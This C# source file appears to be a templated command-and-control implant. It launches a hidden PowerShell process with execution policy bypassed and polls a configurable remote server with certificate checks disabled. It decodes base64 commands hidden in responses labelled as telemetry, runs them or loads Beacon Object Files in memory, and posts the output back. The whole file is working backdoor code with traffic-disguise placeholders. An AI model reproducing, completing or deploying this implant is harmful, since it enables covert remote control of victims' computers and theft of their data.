using RunOF.Internals;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace RunOF
{
	class Program
	{
		private const int ERROR_INVALID_COMMAND_LINE = 0x667;
		private static byte[] file_bytes;

		public static void Main(string[] args)
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			MainAsync(args).GetAwaiter().GetResult();
		}

		static readonly object _logLock = new object();
		static string _logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "debug.log");
		private static bool bof_exec;

		internal static void Log(string msg, Exception ex = null)
		{
			try
			{
				var line = $"[{DateTime.UtcNow:O}] {msg}" + (ex != null ? $" | EX: {ex}" : "");
				lock (_logLock) File.AppendAllText(_logPath, line + Environment.NewLine, Encoding.UTF8);
			}
			catch { /* avoid crashing on logging errors */ }
		}

		static bool ExtractOP(string text, out string opId)
		{
			try
			{
				opId = null;
				bool hasConsole = Regex.IsMatch(text, @"(?mi)^\s*Write-Output\s+""__(?:END)?OP__console__"";?\s*$");
				var m = Regex.Match(text, @"(?mi)^\s*Write-Output\s+""__(?:END)?OP__(?<op>[A-Za-z0-9_-]+)__"";?\s*$");

				if (hasConsole)
				{
					Log("Found Console in OPID regex match");
					opId = "console";
					return true;
				}
				else
				{
					opId = m.Success ? m.Groups["op"].Value : null;
					return true;
				}
			}
			catch {
				opId = null;
				return false;
			}
		}

		static bool SendProgramType(string test, string ID, out string formatted_val)
		{
			try
			{
				formatted_val = test;
				formatted_val = Regex.Replace(test, $@"(?mi)^\s*Write-Output\s+""__OP__{ID}__"";?\s*$", "");
				formatted_val = Regex.Replace(test, $@"(?mi)^\s*Write-Output\s+""__ENDOP__{ID}__"";?\s*$", "");
				Log($"Searching string for program string: programchecktyperightnow");
				if (formatted_val.IndexOf("programchecktyperightnow", StringComparison.OrdinalIgnoreCase) >= 0)
				{
					Log("Found program check");
					return true;
				}
				else
				{
					Log("Didn't find program string");
					return false;
				}
			}
			catch {
				formatted_val = null;
				return false;
			}


		}

		static bool TryExtractBofexec(string text, string ID, out string b64)
		{
			b64 = null;
			if (string.IsNullOrEmpty(text)) return false;

			// Fast precheck to avoid regex work
			if (text.IndexOf("bofexec", StringComparison.OrdinalIgnoreCase) < 0) return false;

			// Remove noisy PS markers if present
			text = Regex.Replace(text, $@"(?mi)^\s*Write-Output\s+""__OP__{ID}__"";?\s*$", "");
			text = Regex.Replace(text, $@"(?mi)^\s*Write-Output\s+""__ENDOP__{ID}__"";?\s*$", "");

			foreach (var raw in text.Replace("\r\n", "\n").Split(new[] { '\n' }, StringSplitOptions.None))
			{
				var line = raw.Trim();
				if (line.Length == 0) continue;

				// bofexec <BASE64>  (captures b64 token)
				var m = Regex.Match(line, @"\bbofexec\b\s+(?<b64>[A-Za-z0-9+/=]+)", RegexOptions.IgnoreCase);
				if (m.Success)
				{
					b64 = m.Groups["b64"].Value;
					return true;
				}
			}
			return false;
		}

		public static async Task MainAsync(string[] args)
		{
			// 1) Generate a persistent SID
			var sid = GenerateSid();

			// 2) Endpoints (profile-aware)
			var getUrl = "{{GET_URL}}";
			var postUrl = "{{POST_URL}}";
			Log($"GET URL: {getUrl}  POST URL: {postUrl}");

			// 3) Start a hidden, persistent PowerShell process
			var psi = new ProcessStartInfo
			{
				FileName = "powershell.exe",
				Arguments = "-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass",
				RedirectStandardInput = true,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true,
			};
			var ps = Process.Start(psi);
			if (ps == null)
			{
				return;
			}

			var outMem = new MemoryStream();
			var errMem = new MemoryStream();
			Thread tOut = new Thread(() => CopyStream(ps.StandardOutput.BaseStream, outMem)) { IsBackground = true };
			Thread tErr = new Thread(() => CopyStream(ps.StandardError.BaseStream, errMem)) { IsBackground = true };
			tOut.Start();
			tErr.Start();

			var psIn = ps.StandardInput;

			// 4) Main loop
			while (true)
			{

				try
				{
					var handler = new HttpClientHandler
					{
						ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
					};

					using (var client = new HttpClient(handler) { BaseAddress = new Uri(getUrl) })
					{
						var getReq = new HttpRequestMessage(HttpMethod.Get, getUrl);
						getReq.Headers.TryAddWithoutValidation("X-Session-ID", sid);
						getReq.Headers.UserAgent.ParseAdd("{{USER_AGENT}}");
						{{ACCEPT_LINE}}
						{{HOST_LINE}}
						{{RANGE_LINE}}
						{{GET_HEADERS}}

						var getResp = await client.SendAsync(getReq);
						Log($"Sending GET: uri={getReq.RequestUri} headers=[{string.Join(";", getReq.Headers)}]");
						var body = await getResp.Content.ReadAsStringAsync();
						Log($"GET status={(int)getResp.StatusCode} len={body?.Length ?? 0}");
						bof_exec = false;

						Log($"Got Body: {body}");

						var cmdB64 = ParseTelemetry(body);
						if (!string.IsNullOrEmpty(cmdB64))
						{
							var cmdBytes = Convert.FromBase64String(cmdB64);
							var cmdText = Encoding.UTF8.GetString(cmdBytes);

							

							Log($"Got command {cmdText}");

							string opId = null;
							if (ExtractOP(cmdText, out opId))
							{
								opId = opId;
							}
							else
							{
								opId = null;
								if (Exit(psIn, ps, "console"))
								{
									Environment.Exit(0);
								}
								else
								{
									Environment.Exit(0);
								}
							}

							//if (cmdText.StartsWith("bofexec ", StringComparison.OrdinalIgnoreCase))
							if (TryExtractBofexec(cmdText, opId, out var b64))
							{
								Log("Entered BOF if case");
								bof_exec = true;
								ParsedArgs ParsedArgs;
								try
								{
									string[] parts = cmdText.Split(new[] { ' ' });
									Log("Split cmdText into indexs using spaces");
									if (parts.Length > 1)
									{
										Log($"Set OPID to {opId}");

										Log("Length of parts is greater than 1 attempting to decode base64 BOF");
										file_bytes = Convert.FromBase64String(b64);
										Log("Decoded base64 into file bytes of BOF");
										Log("About to parse BOF arguments");

										int bofIdx = Array.FindIndex(parts, p => p.Equals("bofexec", StringComparison.OrdinalIgnoreCase));
										var remaining = parts.Skip(bofIdx + 2);

										var argv = new[] { "bofexec", b64 }.Concat(remaining).ToArray();

										ParsedArgs = new ParsedArgs(argv);
										Log("Successfully Parsed arguments for BOF About to initalize BOF runner");

										Log("About to initalize Bof Runner!");
										BofRunner bof_runner = new BofRunner(ParsedArgs);
										Log("Successfully Initalized BOF Runner");

										bof_runner.LoadBof();
										var Result = bof_runner.RunBof((uint)ParsedArgs.thread_timeout);
										Log($"Got BOF result {Result.Output}");

										var outBytes = Encoding.UTF8.GetBytes(Result.Output);
										Log($"Got output Bytes from BOF: {outBytes}");
										var outB64 = Convert.ToBase64String(outBytes);

										SendPowerShellLines(psIn,
											$"Write-Output __OP__{opId}__",
											$"$b64='{outB64}'",
											"$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))",
											"Write-Output $s",
											$"Write-Output __ENDOP__{opId}__");

										//Log($"Sending command {command} to standard input!");
									}
									else
									{
										Log("Length of parts is less than 1");
										return;
									}


								}
								catch (Exception ex)
								{
									Log($"Hit exception in BOF built in shell executor {ex}");
									return;
								}

							}
							else
							{
								if (ExtractOP(cmdText, out opId))
								{
									opId = opId;
								}
								else
								{
									if (Exit(psIn, ps, opId))
									{
										Environment.Exit(0);
									}
									else {
										Environment.Exit(0);
									}
								}

								Log($"Found OPID {opId}");

								if (SendProgramType(cmdText, opId, out string formatted_val))
								{
									Log($"Using OPID {opId} for program check");
									SendPowerShellLines(psIn,
										$"Write-Output __OP__{opId}__",
										"Write-Output specialprogram",
										$"Write-Output __ENDOP__{opId}__");
								}
								else
								{
									Log($"Sending normal command since bofexec was not found: {cmdText}");
									psIn.WriteLine(cmdText);
									psIn.Flush();
								}
							}
						}

						bof_exec = false;
						Log($"Bof_exec var is: {bof_exec}");

						if (!bof_exec)
						{
							Thread.Sleep({{SLEEP_SHORT}});

							string outRaw;
							lock (outMem)
							{
								outMem.Position = 0;
								errMem.Position = 0;
								var stdout = new StreamReader(outMem, Encoding.UTF8).ReadToEnd();
								var stderr = new StreamReader(errMem, Encoding.UTF8).ReadToEnd();
								outRaw = stdout + stderr;
								outMem.SetLength(0);
								errMem.SetLength(0);
							}

							Log($"Got Output from powershell process: {outRaw}");

							var outBytes = Encoding.UTF8.GetBytes(outRaw);
							var outB64 = Convert.ToBase64String(outBytes);
							var json = {{POST_JSON_EXPR}};

							Log($"Sending json {json}");

							var postReq = new HttpRequestMessage(HttpMethod.Post, postUrl);
							postReq.Headers.UserAgent.ParseAdd("{{USER_AGENT}}");
							postReq.Content = new StringContent(json, Encoding.UTF8, "application/json");
							postReq.Headers.TryAddWithoutValidation("X-Session-ID", sid);
							{{POST_HEADERS}}

							Log($"POSTing json length={json.Length}");
							var postResp = await client.SendAsync(postReq);
							var respBody = await postResp.Content.ReadAsStringAsync();
							Log($"POST status={(int)postResp.StatusCode} len={respBody?.Length ?? 0}");
						}
					}
				}
				catch (Exception ex)
				{
					Log("Unhandled error", ex);
				}

				Thread.Sleep({{SLEEP_LONG}});
			}
		}

		static void SendPowerShellLines(StreamWriter stdin, params string[] lines)
		{
			foreach (var line in lines)
				stdin.WriteLine(line);

			stdin.WriteLine();
			stdin.Flush();
		}

		static void CopyStream(Stream input, Stream output)
		{
			var buffer = new byte[4096];
			int read;
			try
			{
				while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
				{
					output.Write(buffer, 0, read);
					output.Flush();
				}
			}
			catch
			{
			}
		}

		static bool Exit(StreamWriter input, Process point, string ID)
		{
			SendPowerShellLines(input,
				$"Write-Output __OP__{ID}__",
				"Write-Output Ending",                       
				$"Write-Output __ENDOP__{ID}__");

			try {
				input.Close();
			}
			catch { }

			try
			{
				point.Kill();
			}
			catch { }

			try
			{
				point.Dispose();
			}
			catch { }
			return true;
		}

		static string GenerateSid()
		{
			const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
			int seed = (int)DateTime.UtcNow.Ticks ^ Process.GetCurrentProcess().Id;
			var rnd = new Random(seed);
			var sb = new StringBuilder(3 * 5 + 2);
			for (int seg = 0; seg < 3; seg++)
			{
				for (int i = 0; i < 5; i++)
					sb.Append(chars[rnd.Next(chars.Length)]);
				if (seg < 2) sb.Append('-');
			}
			return sb.ToString();
		}

		static string ParseTelemetry(string resp)
		{
			var m = Regex.Match(resp, "{{PROBE_UNION}}");
			if (m.Success)
			{
				return m.Groups["b64"].Value;
			} else {
				return null;
			}
		
		}
	}
}
